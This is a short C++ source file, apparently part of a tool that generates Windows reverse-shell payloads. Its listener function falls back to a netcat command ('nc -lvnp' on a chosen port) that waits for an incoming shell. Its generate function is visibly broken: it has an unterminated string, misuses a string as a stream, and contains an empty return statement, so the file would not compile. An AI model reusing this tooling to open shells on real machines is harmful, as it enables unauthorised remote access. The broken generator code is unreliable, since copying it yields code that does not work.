#include "C_Windows_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string CWindowsPayload::name() const {
return "c_windows";
}

std::string CWindowsPayload::generate(const Options& opts) const {
    std::string ss;
    ss << "#include <winsock2."
    return ;
}

std::string CWindowsPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}